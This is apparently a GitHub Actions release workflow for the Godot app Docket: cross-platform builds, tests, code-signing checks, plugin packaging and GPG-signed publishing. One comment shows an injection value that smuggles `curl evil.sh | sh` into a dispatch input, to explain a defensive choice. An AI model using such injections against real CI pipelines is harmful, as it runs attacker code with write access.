name: Release

on:
  push:
    tags: ["v*"]
  workflow_dispatch:
    inputs:
      tag:
        description: "Tag to build and publish (e.g. v0.1.0); leave empty with validate_only"
        required: false
        default: ""
      validate_only:
        # Runs every build, export and check on all three platforms for the
        # chosen branch or tag, and publishes nothing.
        description: "Build and check only; publish nothing"
        type: boolean
        required: false
        default: false

env:
  GODOT_VERSION: "4.7.1"
  # The oldest Godot a host embedding Docket runs (Minerva); the shipped
  # native library must load there too.
  HOST_GODOT_VERSION: "4.6.2"

permissions:
  contents: write

jobs:
  build:
    name: ${{ matrix.name }}
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        include:
          - name: macOS (universal)
            os: macos-latest
            platform: macos
            arch: universal
            # The editor only runs on this arm64 runner; the package is universal.
            editor_arch: arm64
            preset: macOS
            rust_targets: x86_64-apple-darwin,aarch64-apple-darwin
          - name: Linux (x86_64)
            os: ubuntu-latest
            platform: linux
            arch: x86_64
            editor_arch: x86_64
            preset: Linux
            rust_targets: x86_64-unknown-linux-gnu
          - name: Windows (x86_64)
            os: windows-latest
            platform: windows
            arch: x86_64
            editor_arch: x86_64
            preset: Windows
            rust_targets: x86_64-pc-windows-msvc

    steps:
      # A manual release builds the tag it publishes; anything else builds the
      # exact commit the run was started for, so every platform builds the same
      # commit even if a branch moves meanwhile.
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.inputs.tag && format('refs/tags/{0}', github.event.inputs.tag) || github.sha }}
          submodules: recursive

      # INPUT_TAG goes through env, never interpolated into the script body.
      # `${{ github.event.inputs.tag }}` written inline is substituted before bash
      # sees it, so a dispatch input like `x"; curl evil.sh | sh #` executes — in
      # a job holding contents:write. Via env it is only ever a shell variable's
      # value.
      - name: Check what is being built
        shell: bash
        env:
          INPUT_TAG: ${{ github.event.inputs.tag }}
          VALIDATE_ONLY: ${{ github.event.inputs.validate_only }}
        run: |
          set -euo pipefail
          if [ "$GITHUB_EVENT_NAME" = workflow_dispatch ] && [ "$VALIDATE_ONLY" != true ] && [ -z "$INPUT_TAG" ]; then
            echo "a manual release needs a tag; use validate_only to build without one"; exit 1
          fi
          if [ -n "$INPUT_TAG" ]; then
            # The plugin archive's name drops the "v" the app archives keep,
            # so a published release never holds two files of one name.
            case "$INPUT_TAG" in v*) ;; *) echo "a release tag starts with v: $INPUT_TAG"; exit 1 ;; esac
            [ "$(git rev-parse HEAD)" = "$(git rev-parse "refs/tags/$INPUT_TAG^{commit}")" ] \
              || { echo "the checkout is not tag $INPUT_TAG"; exit 1; }
          else
            [ "$(git rev-parse HEAD)" = "$GITHUB_SHA" ] \
              || { echo "the checkout is not the run's commit $GITHUB_SHA"; exit 1; }
          fi
          echo "building $(git rev-parse HEAD)"
          # The name the packages carry. Explicit input wins: on
          # workflow_dispatch GITHUB_REF_NAME is the *branch* ("development"),
          # not a tag, so preferring it would name every dispatched artifact
          # after the branch. A validate-only run of a branch such as
          # feature/x names files after it.
          VERSION="${INPUT_TAG:-$GITHUB_REF_NAME}"
          echo "VERSION=${VERSION//\//-}" >> "$GITHUB_ENV"

      - name: Install SCons
        run: pipx install scons

      # The build's inputs include the pinned godot-sqlite commit and the
      # patches applied to it (build_gdextension.sh).
      - name: Pinned godot-sqlite commit
        id: sqlite_pin
        shell: bash
        run: echo "sha=$(git rev-parse HEAD:third_party/godot-sqlite)" >> "$GITHUB_OUTPUT"

      - name: Cache godot-cpp objects
        uses: actions/cache@v6
        with:
          path: |
            third_party/godot-sqlite/godot-cpp/bin
            third_party/godot-sqlite/godot-cpp/gen
            third_party/godot-sqlite/.sconsign.dblite
          key: godot-cpp-${{ matrix.platform }}-${{ matrix.arch }}-${{ steps.sqlite_pin.outputs.sha }}-${{ hashFiles('third_party/patches/**') }}-${{ hashFiles('.gitmodules') }}-${{ hashFiles('third_party/godot-sqlite/godot-cpp/SConstruct') }}

      # Windows runners have bash via Git for Windows, so one script covers all
      # three platforms. MSVC is already on the image and SCons finds it.
      # Both targets: release goes into the exported app, debug is what the
      # Godot tool binary loads for the pre-release test run below.
      - name: Build GDExtension from source
        shell: bash
        run: ./scripts/build/build_gdextension.sh ${{ matrix.platform }} ${{ matrix.arch }} all

      # The exact Rust named in rust-toolchain.toml, with the targets
      # native/build.sh builds on this runner.
      - name: Install pinned Rust
        shell: bash
        run: |
          set -euo pipefail
          RUST="$(tr -d '\r' < rust-toolchain.toml | sed -n 's/^channel = "\(.*\)"$/\1/p')"
          [ -n "$RUST" ] || { echo "rust-toolchain.toml names no channel"; exit 1; }
          rustup toolchain install "$RUST" --profile minimal --target "${{ matrix.rust_targets }}"

      - name: Build Rust extension from source
        shell: bash
        run: ./native/build.sh

      - name: Preflight checks
        shell: bash
        run: ./scripts/build/preflight.sh

      # Official Godot 4.7.1 source with an editor-only patch, built for this
      # runner; see scripts/build/build_godot_editor.sh.
      - name: Cache the Godot editor
        uses: actions/cache@v6
        with:
          path: ~/godot-editor
          key: godot-editor-${{ matrix.platform }}-${{ matrix.editor_arch }}-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles('third_party/godot/**', 'scripts/build/build_godot_editor.sh') }}

      - name: Build or check the Godot editor
        shell: bash
        run: |
          set -euo pipefail
          GODOT_BIN="$(./scripts/build/build_godot_editor.sh ${{ matrix.platform }} ${{ matrix.editor_arch }} "$HOME/godot-editor" | tail -1)"
          echo "GODOT_BIN=$GODOT_BIN" >> "$GITHUB_ENV"

      - name: Install the official export templates
        shell: bash
        run: ./scripts/build/install_godot_templates.sh

      - name: Import project
        shell: bash
        timeout-minutes: 20
        run: ./scripts/build/import_project.sh "$GODOT_BIN"

      - name: Run tests before shipping
        shell: bash
        run: |
          set -euo pipefail
          "$GODOT_BIN" --headless --path . -- test 2>&1 | tee test-output.txt
          grep -q "ALL TESTS PASSED" test-output.txt

      - name: Export ${{ matrix.preset }}
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p build/${{ matrix.platform }}
          # --export-release fails the build on export errors; --headless keeps
          # it non-interactive. The preset name must match export_presets.cfg.
          "$GODOT_BIN" --headless --path . --export-release "${{ matrix.preset }}"

      # A GDExtension library missing at export time is only logged, so check
      # that the app really contains Docket's native library.
      - name: Check the native extension was exported
        shell: bash
        run: |
          set -euo pipefail
          case "${{ matrix.platform }}" in
            macos)   LIB="build/macos/Docket.app/Contents/Frameworks/docket_native.macos.template_release.universal.dylib" ;;
            linux)   LIB="build/linux/docket_native.linux.template_release.x86_64.so" ;;
            windows) LIB="build/windows/docket_native.windows.template_release.x86_64.dll" ;;
          esac
          test -s "$LIB" || { echo "the export has no native library at $LIB"; exit 1; }
          echo "NATIVE_LIB=$LIB" >> "$GITHUB_ENV"

      # The library as exported must be the one built from this commit, and
      # must load both in Docket's Godot and in the oldest Godot a host runs.
      # A failure here fails the build, so nothing is published.
      - name: Check the exported native library loads
        shell: bash
        run: |
          set -euo pipefail
          BUILT="addons/docket_native/bin/$(basename "$NATIVE_LIB")"
          if command -v sha256sum > /dev/null; then sha256sum "$NATIVE_LIB" "$BUILT"; else shasum -a 256 "$NATIVE_LIB" "$BUILT"; fi
          if [ "${{ matrix.platform }}" = macos ]; then
            # Export signs the library, which changes its bytes but not the
            # build UUIDs of its architectures.
            EXPORTED_UUIDS="$(dwarfdump --uuid "$NATIVE_LIB" | awk '{print $2, $3}')"
            BUILT_UUIDS="$(dwarfdump --uuid "$BUILT" | awk '{print $2, $3}')"
            [ -n "$EXPORTED_UUIDS" ] && [ "$EXPORTED_UUIDS" = "$BUILT_UUIDS" ] \
              || { echo "the exported library is not the one built:"; printf '%s\n' "$EXPORTED_UUIDS" "$BUILT_UUIDS"; exit 1; }
          else
            cmp "$NATIVE_LIB" "$BUILT"
          fi
          ./scripts/build/check_native_load.sh "$GODOT_BIN" "$NATIVE_LIB"

          BASE="https://github.com/godotengine/godot/releases/download/${HOST_GODOT_VERSION}-stable"
          mkdir -p ~/godot-host && cd ~/godot-host
          case "${{ runner.os }}" in
            macOS)   curl -fSL -o godot.zip "$BASE/Godot_v${HOST_GODOT_VERSION}-stable_macos.universal.zip" ;;
            Linux)   curl -fSL -o godot.zip "$BASE/Godot_v${HOST_GODOT_VERSION}-stable_linux.x86_64.zip" ;;
            Windows) curl -fSL -o godot.zip "$BASE/Godot_v${HOST_GODOT_VERSION}-stable_win64.exe.zip" ;;
          esac
          unzip -q godot.zip && rm godot.zip
          case "${{ runner.os }}" in
            macOS)   HOST_BIN="$HOME/godot-host/Godot.app/Contents/MacOS/Godot" ;;
            # The console build, so its output reaches this log.
            Windows) HOST_BIN="$(find "$HOME/godot-host" -maxdepth 1 -name 'Godot_v*_console.exe' | head -1)" ;;
            *)       HOST_BIN="$(find "$HOME/godot-host" -maxdepth 1 -name 'Godot_v*' -type f | head -1)" ;;
          esac
          chmod +x "$HOST_BIN" || true
          cd "$GITHUB_WORKSPACE"
          ./scripts/build/check_native_load.sh "$HOST_BIN" "$NATIVE_LIB"

      # macOS: Godot invokes Apple's native codesign tool with an empty identity,
      # which selects ad-hoc signing (codesign/codesign=3). Godot's built-in
      # signer produces an invalid outer resource seal for the nested SQLite
      # framework. The app is NOT notarized — see docs/SIGNING.md.
      # Two separate questions, deliberately checked separately:
      #   1. Does Godot's exported bundle verify at all?
      #   2. Does our packaging break it?
      # The previous version only ran `codesign -dv`, which DISPLAYS signature
      # metadata and never checks integrity — so it passed while the bundle was
      # already invalid, and the failure surfaced later in Package, pointing at
      # the wrong culprit.
      - name: Verify macOS signature (as exported)
        if: matrix.platform == 'macos'
        run: |
          set -uo pipefail
          echo "--- signature metadata ---"
          codesign -dv --verbose=2 build/macos/Docket.app 2>&1 || true
          echo "--- embedded Mach-O objects ---"
          find build/macos/Docket.app -type f -perm +111 -exec file {} \; 2>/dev/null | grep -i mach-o || true
          echo "--- nested frameworks ---"
          ls -la build/macos/Docket.app/Contents/Frameworks/ 2>/dev/null || echo "(none)"
          for fw in build/macos/Docket.app/Contents/Frameworks/*.framework; do
            [ -d "$fw" ] || continue
            echo "  $fw"
            ls -R "$fw" | sed 's/^/    /'
            codesign --verify --strict --verbose=4 "$fw" 2>&1 | sed 's/^/    /' || true
          done
          echo "--- deep verification of the exported bundle ---"
          if codesign --verify --deep --strict --verbose=4 build/macos/Docket.app 2>&1; then
            echo "RESULT: exported bundle passes deep verification"
          else
            echo "RESULT: exported bundle FAILS deep verification (before any packaging)"
            exit 1
          fi

      # godot-sqlite and godot-cpp are MIT: their copyright notice must ship with
      # any binary that includes them, and we compile both into the app. Built
      # from the vendored trees so it cannot drift from what was actually linked.
      - name: Collect third-party licenses
        shell: bash
        run: |
          set -euo pipefail
          OUT=THIRD-PARTY-LICENSES.txt
          {
            echo "Docket bundles the following third-party components."
            echo "Docket itself is licensed under MPL-2.0; see LICENSE."
            echo
            echo "================================================================"
            echo "godot-sqlite — https://github.com/2shady4u/godot-sqlite"
            echo "vendored at $(git -C third_party/godot-sqlite rev-parse HEAD)"
            echo "================================================================"
            cat third_party/godot-sqlite/LICENSE.md
            echo
            echo "================================================================"
            echo "godot-cpp — https://github.com/godotengine/godot-cpp"
            echo "vendored at $(git -C third_party/godot-sqlite/godot-cpp rev-parse HEAD)"
            echo "================================================================"
            cat third_party/godot-sqlite/godot-cpp/LICENSE.md
            echo
            # Windows runners name it python, not python3.
            PYTHON="$(command -v python3 || command -v python)"
            "$PYTHON" native/third_party_licenses.py "${{ matrix.rust_targets }}"
          } > "$OUT"
          echo "wrote $OUT ($(wc -l < "$OUT") lines)"

      # The plugin a host (Minerva) installs: this target's whole release
      # export with the panel beside it and the notices its binaries need,
      # as <id>-<version>-<target>.tar.gz, then checked as a host receives
      # it. Staged before Package adds the app's other files to the export
      # directories.
      - name: Package and check the plugin
        shell: bash
        timeout-minutes: 30
        run: |
          set -euo pipefail
          PLUGIN_VERSION="${VERSION#v}"
          case "${{ matrix.platform }}" in
            macos) EXPORT=build/macos/Docket.app ;;
            *)     EXPORT="build/${{ matrix.platform }}" ;;
          esac
          PYTHON="$(command -v python3 || command -v python)"
          "$PYTHON" scripts/build/package_plugin.py --out build/plugin --version "$PLUGIN_VERSION" \
            --target "${{ matrix.platform }}" --export-root "$EXPORT" \
            --notice LICENSE --notice THIRD-PARTY-LICENSES.txt --notice docs/sbom.cdx.json
          mkdir -p dist-plugin
          ARCHIVE="dist-plugin/docket-${PLUGIN_VERSION}-${{ matrix.platform }}-${{ matrix.arch }}.tar.gz"
          # No AppleDouble files for extended attributes: they would be
          # files the package's SHA256SUMS does not list.
          COPYFILE_DISABLE=1 tar -czf "$ARCHIVE" -C build/plugin .
          "$PYTHON" scripts/build/check_plugin_package.py "$ARCHIVE" "$PLUGIN_VERSION"
          # What the Intel check (macos-intel-runtime) must find: this commit,
          # this version, this one archive and its digest.
          if [ "${{ matrix.platform }}" = macos ]; then
            mkdir -p plugin-check
            "$PYTHON" -c 'import hashlib, json, sys; archive = sys.argv[1]; json.dump({"source": sys.argv[2], "version": sys.argv[3], "archive": archive.rsplit("/", 1)[-1], "sha256": hashlib.sha256(open(archive, "rb").read()).hexdigest()}, open("plugin-check/plugin.json", "w"))' \
              "$ARCHIVE" "$(git rev-parse HEAD)" "$PLUGIN_VERSION"
          fi

      - name: Package
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p dist

          case "${{ matrix.platform }}" in
            macos)
              # A plain zip preserves the bundle and its ad-hoc signature. A .dmg
              # would need signing to avoid an extra Gatekeeper prompt, so it buys
              # nothing while we ship unsigned.
              #
              # Licences sit NEXT TO the .app, never inside it. Adding any file to
              # a signed bundle invalidates the seal ("a sealed resource is missing
              # or invalid"), and on Apple Silicon a broken signature means the app
              # will not launch at all.
              #
              # ditto, not cp -R: cp does not preserve macOS extended attributes,
              # so the copied bundle failed `codesign --verify` with "a sealed
              # resource is missing or invalid" — the signature the app needs to
              # launch on Apple Silicon at all.
              STAGE="build/macos/stage"
              mkdir -p "$STAGE"
              ditto build/macos/Docket.app "$STAGE/Docket.app"
              cp README.md LICENSE THIRD-PARTY-LICENSES.txt docs/sbom.cdx.json "$STAGE/"
              ditto -c -k --sequesterRsrc "$STAGE" "dist/docket-${VERSION}-macos-universal.zip"
              # The copy must still verify — catches any accidental mutation.
              codesign --verify --deep "$STAGE/Docket.app"
              ;;
            linux)
              cp README.md LICENSE THIRD-PARTY-LICENSES.txt docs/sbom.cdx.json build/linux/
              tar -czf "dist/docket-${VERSION}-linux-x86_64.tar.gz" -C build/linux .
              ;;
            windows)
              cp README.md LICENSE THIRD-PARTY-LICENSES.txt docs/sbom.cdx.json build/windows/
              cd build/windows && 7z a -tzip "../../dist/docket-${VERSION}-windows-x86_64.zip" . && cd ../..
              ;;
          esac
          ls -la dist/

      - name: Upload artifact
        uses: actions/upload-artifact@v7
        with:
          name: docket-${{ matrix.platform }}
          path: dist/*
          if-no-files-found: error

      - name: Upload plugin artifact
        uses: actions/upload-artifact@v7
        with:
          name: docket-plugin-${{ matrix.platform }}
          path: dist-plugin/*
          if-no-files-found: error

      # Not a release asset: publish downloads only docket-* artifacts.
      - name: Upload the macOS plugin's description for the Intel check
        if: matrix.platform == 'macos'
        uses: actions/upload-artifact@v7
        with:
          name: intel-check-plugin-macos
          path: plugin-check/plugin.json
          if-no-files-found: error

  # The universal macOS plugin runs on the arm64 build runner only; this
  # starts the same archive, from this run, on an Intel Mac.
  macos-intel-runtime:
    name: macOS Intel (plugin runtime)
    needs: build
    runs-on: macos-15-intel
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.inputs.tag && format('refs/tags/{0}', github.event.inputs.tag) || github.sha }}

      - name: Download the macOS plugin
        uses: actions/download-artifact@v8
        with:
          name: docket-plugin-macos
          path: plugin

      - name: Download its description
        uses: actions/download-artifact@v8
        with:
          name: intel-check-plugin-macos
          path: plugin-check

      - name: Check the plugin on Intel
        shell: bash
        run: |
          set -euo pipefail
          [ "$(uname -m)" = x86_64 ] || { echo "this runner is $(uname -m), not an Intel Mac"; exit 1; }
          python3 - <<'CHECK'
          import hashlib, json, os, subprocess, sys, tempfile
          described = json.load(open("plugin-check/plugin.json"))
          head = subprocess.check_output(["git", "rev-parse", "HEAD"], text=True).strip()
          if described["source"] != head:
              sys.exit("the plugin was built from %s, this checkout is %s" % (described["source"], head))
          if sorted(os.listdir("plugin")) != [described["archive"]]:
              sys.exit("expected only %s, found %s" % (described["archive"], sorted(os.listdir("plugin"))))
          archive = os.path.join("plugin", described["archive"])
          if hashlib.sha256(open(archive, "rb").read()).hexdigest() != described["sha256"]:
              sys.exit("%s is not the archive the build made" % archive)
          # The entrypoint must hold an x86_64 slice, not only run under Rosetta.
          unpacked = tempfile.mkdtemp()
          subprocess.check_call(["tar", "-xzf", os.path.abspath(archive), "-C", unpacked])
          entrypoint = json.load(open(os.path.join(unpacked, "manifest.json")))["backend"]["entrypoint"]
          archs = subprocess.check_output(["lipo", "-archs", os.path.join(unpacked, entrypoint)], text=True).split()
          if "x86_64" not in archs:
              sys.exit("%s has no x86_64 slice: %s" % (entrypoint, archs))
          print("%s %s: %s, archs %s" % (described["archive"], described["version"], described["sha256"], archs))
          CHECK
          ARCHIVE="$(python3 -c 'import json; print(json.load(open("plugin-check/plugin.json"))["archive"])')"
          PLUGIN_VERSION="$(python3 -c 'import json; print(json.load(open("plugin-check/plugin.json"))["version"])')"
          python3 scripts/build/check_plugin_package.py "plugin/$ARCHIVE" "$PLUGIN_VERSION"

  publish:
    name: Sign checksums and publish release
    needs: [build, macos-intel-runtime]
    if: github.event_name == 'push' || github.event.inputs.validate_only != 'true'
    runs-on: ubuntu-latest
    # Job-level env, deliberately: a step's own `env:` block is NOT visible to
    # that step's `if:` expression, so gating on it there silently evaluates to
    # false and skips signing without failing the build.
    env:
      GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
      GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
    steps:
      - uses: actions/checkout@v7

      - name: Download all release artifacts
        uses: actions/download-artifact@v8
        with:
          pattern: docket-*
          path: artifacts
          merge-multiple: true

      - name: Generate SHA256SUMS
        run: |
          set -euo pipefail
          cd artifacts
          sha256sum * > SHA256SUMS
          cat SHA256SUMS

      # The GPG signature is the only real integrity guarantee we ship, since
      # the binaries themselves are unsigned. Users verify against the key
      # fingerprint published in the README.
      - name: Warn if signing key is absent
        if: env.GPG_PRIVATE_KEY == ''
        run: |
          echo "::warning title=Unsigned release::GPG_PRIVATE_KEY secret is not set — publishing SHA256SUMS without a signature. See docs/SIGNING.md."

      - name: Import GPG signing key
        if: env.GPG_PRIVATE_KEY != ''
        run: |
          echo "$GPG_PRIVATE_KEY" | gpg --batch --import
          gpg --list-secret-keys

      - name: Sign SHA256SUMS
        if: env.GPG_PRIVATE_KEY != ''
        run: |
          set -euo pipefail
          cd artifacts
          echo "$GPG_PASSPHRASE" | gpg --batch --yes --pinentry-mode loopback \
            --passphrase-fd 0 --armor --detach-sign SHA256SUMS
          gpg --verify SHA256SUMS.asc SHA256SUMS

      - name: Publish GitHub release
        # Third-party action running in a job with contents:write and access to
        # the signing key. Pinned to a commit SHA: a tag can be moved by whoever
        # controls that repo, which would hand them both.
        uses: softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228  # v3.0.2
        with:
          # Same precedence as VERSION above: on dispatch, github.ref_name is the
          # branch, and using it would create a release tagged "development".
          tag_name: ${{ github.event.inputs.tag || github.ref_name }}
          # Hyphenated tags are semver prereleases (v0.0.1-test, v1.0.0-rc1).
          # Marking them keeps test and candidate builds out of "Latest release".
          prerelease: ${{ contains(github.event.inputs.tag || github.ref_name, '-') }}
          files: artifacts/*
          generate_release_notes: true
          body: |
            ## Install

            Binaries are **unsigned**. Verify them before running:

            ```bash
            gpg --verify SHA256SUMS.asc SHA256SUMS
            sha256sum -c SHA256SUMS --ignore-missing
            ```

            **macOS** — the app is ad-hoc signed but not notarized. On first launch,
            right-click the app and choose *Open*, then confirm. See `docs/SIGNING.md`.

            **Windows** — SmartScreen will warn that the publisher is unrecognized.
            Choose *More info* → *Run anyway*.

            **Linux** — extract and run `./docket.x86_64`.
